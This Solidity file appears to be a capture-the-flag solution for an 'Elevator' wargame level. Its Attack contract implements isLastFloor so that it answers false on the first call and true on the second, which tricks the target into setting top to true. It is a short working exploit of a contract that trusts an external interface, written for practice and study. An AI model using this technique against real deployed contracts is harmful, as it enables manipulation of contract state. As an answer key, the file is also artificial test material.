// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./12_Elevator.sol";

contract Attack {
    Elevator elevator;
    uint8 count = 0;

    constructor(address payable _elevator) {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(1);
        require(elevator.floor() == 1, "Wrong floor");
        require(elevator.top(), "Fail to reach.");
    }

    function isLastFloor(uint256) external returns (bool) {
        if (count == 0) {
            count += 1;
            return false;
        } else {
            count = 0;
            return true;
        }
    }
}
